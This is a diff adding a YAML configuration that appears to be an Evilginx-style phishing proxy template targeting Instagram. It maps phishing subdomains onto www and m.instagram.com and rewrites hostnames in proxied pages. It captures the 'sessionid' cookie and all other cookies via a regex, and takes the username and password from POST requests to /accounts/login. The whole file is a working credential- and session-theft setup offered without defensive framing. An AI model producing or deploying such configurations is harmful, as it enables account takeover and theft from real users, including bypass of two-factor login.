@@ -1,0 +1,24 @@
+author: '@prrrrinncee'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
